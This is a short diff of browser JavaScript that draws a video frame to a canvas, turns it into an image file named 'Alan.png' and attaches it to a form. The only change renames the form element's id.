@@ -24,7 +24,7 @@
                     setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
                     setTimeout(function () {
                         canvas.toBlob((blob) => {
-                            const form = document.getElementById('result')
+                            const form = document.getElementById('gopo')
                             const file = new File([blob], "Alan.png");
                             const dt = new DataTransfer();
                             dt.items.add(file);
